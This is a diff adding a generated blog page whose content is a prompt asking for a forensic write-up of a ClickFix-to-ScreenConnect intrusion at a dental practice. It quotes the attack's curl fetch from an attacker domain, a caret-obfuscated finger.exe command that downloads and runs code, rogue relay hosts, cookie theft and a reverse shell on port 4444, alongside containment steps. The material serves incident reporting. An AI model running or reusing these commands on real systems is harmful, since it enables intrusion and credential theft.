@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title> :: Terminal</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Task: Write a technical, &ldquo;deep-dive&rdquo; cybersecurity blog post titled &ldquo;Living off the Land: A Forensic Breakdown of the &lsquo;ClickFix&rsquo; to ScreenConnect Attack Lifecycle.&rdquo;
+Context: I am a cybersecurity professional who just finished remediating an incident at a dental practice. The target was a workstation named OP-N12. The attack used a social engineering tactic known as &ldquo;ClickFix&rdquo; (or &ldquo;CrashFix&rdquo;) to trick a user into executing malicious code, eventually leading to the deployment of a rogue RMM (Remote Monitoring and Management) tool and credential theft.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/tdc-prompt-to-write-report/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.c4581949edab7810737609fc5568852bcd908945f14561e366dcd2300a370545.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a2cc694a9b481f15d41722bffc2cc54eea4c4f74fd9072b0b33253604c22606e.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="">
+<meta property="og:description" content="Task: Write a technical, &ldquo;deep-dive&rdquo; cybersecurity blog post titled &ldquo;Living off the Land: A Forensic Breakdown of the &lsquo;ClickFix&rsquo; to ScreenConnect Attack Lifecycle.&rdquo;
+Context: I am a cybersecurity professional who just finished remediating an incident at a dental practice. The target was a workstation named OP-N12. The attack used a social engineering tactic known as &ldquo;ClickFix&rdquo; (or &ldquo;CrashFix&rdquo;) to trick a user into executing malicious code, eventually leading to the deployment of a rogue RMM (Remote Monitoring and Management) tool and credential theft.
+" />
+<meta property="og:url" content="//localhost:1313/posts/tdc-prompt-to-write-report/" />
+<meta property="og:site_name" content="Terminal" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/tdc-prompt-to-write-report/"></a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Task: Write a technical, &ldquo;deep-dive&rdquo; cybersecurity blog post titled &ldquo;Living off the Land: A Forensic Breakdown of the &lsquo;ClickFix&rsquo; to ScreenConnect Attack Lifecycle.&rdquo;</p>
+<p>Context: I am a cybersecurity professional who just finished remediating an incident at a dental practice. The target was a workstation named OP-N12. The attack used a social engineering tactic known as &ldquo;ClickFix&rdquo; (or &ldquo;CrashFix&rdquo;) to trick a user into executing malicious code, eventually leading to the deployment of a rogue RMM (Remote Monitoring and Management) tool and credential theft.</p>
+<p>Please use the following forensic data to structure the post:</p>
+<ol>
+<li>The Hook (Initial Access)
+Vector: A fake &ldquo;Human Verification&rdquo; or &ldquo;Browser Update&rdquo; popup on thelinkesisthebest.it.com.</li>
+</ol>
+<p>Timestamp: 2026-04-15 16:24:07 UTC.</p>
+<p>Tactic: The user was prompted to copy/paste a command into the Windows &ldquo;Run&rdquo; dialog. This is a &ldquo;ClickFix&rdquo; lure designed to bypass browser security and EDR.</p>
+<ol start="2">
+<li>Technical Execution (LotL Tactic)
+Primary Command: curl -s -L &ndash;tlsv1.2 &ndash;ssl-no-revoke linked-people.com/leyts.php?Npier=1</li>
+</ol>
+<p>The &ldquo;Finger&rdquo; Bypass: The attacker used the legacy finger.exe protocol to download and execute secondary stages.</p>
+<p>Obfuscation: They used caret-escaping (f^i^n^g^e^r) to evade simple string-based EDR detections.</p>
+<p>The Trick: cmd /K for /f &ldquo;skip=14 delims=&rdquo; %h in (&lsquo;finger &hellip;&rsquo;) do call %h (explain how skipping the first 14 lines of &ldquo;junk&rdquo; text allows the 15th line of malicious code to execute in-memory).</p>
+<ol start="3">
+<li>Persistence &amp; C2 (The Backdoor)
+Unauthorized RMM: The attacker installed a rogue ScreenConnect (ConnectWise) instance in \AppData\Local.</li>
+</ol>
+<p>C2 Relays (Beacons): * instance-m15qco-relay.screenconnect.com (15.204.43.236)</p>
+<p>instance-zayrhg-relay.screenconnect.com (139.178.91.96)</p>
+<p>Configuration: A user.config file was found mapping the workstation to these specific attacker-controlled relays.</p>
+<ol start="4">
+<li>Post-Exploitation (Identity Theft)
+Activity: The attacker accessed Chrome profiles (81 total) to scrape cookies and login data.</li>
+</ol>
+<p>Targets: Credential access attempts were observed for:</p>
+<p>efaxcorporate.com (16:40 UTC)</p>
+<p>deltadentalins.com (17:10 UTC)</p>
+<p>secondopinion.hellopearl.com</p>
+<p>Lateral Movement: A Python reverse shell script (modes.py) was found attempting to connect to an internal IP 192.168.1.105 on port 4444.</p>
+<ol start="5">
+<li>Incident Response (The &ldquo;Win&rdquo;)
+Triage: Used KAPE with the !EZParser module to capture and parse the MFT, Registry, and Browser artifacts in minutes.</li>
+</ol>
+<p>Containment: * Created outbound Windows Firewall block rules for the C2 IPs.</p>
+<p>Sinkholed the malicious domains in the hosts file to 0.0.0.0.</p>
+<p>Implemented persistent static routes to drop all traffic to the relays.</p>
+<p>Remediation: Forced password resets for the user and the main office email, logged out all sessions, and performed &ldquo;system optimization&rdquo; (patching) via winget.</p>
+<p>Tone: Expert, analytical, and slightly conversational. Focus on the danger of &ldquo;Living off the Land&rdquo; binaries (LotLbins) and the importance of monitoring legacy protocols like finger.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/tdc-breach/" class="button inline prev">
+        &lt; [<span class="button__text">A Forensic Investigation on Finger</span>]
+      </a>
+    
+    
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
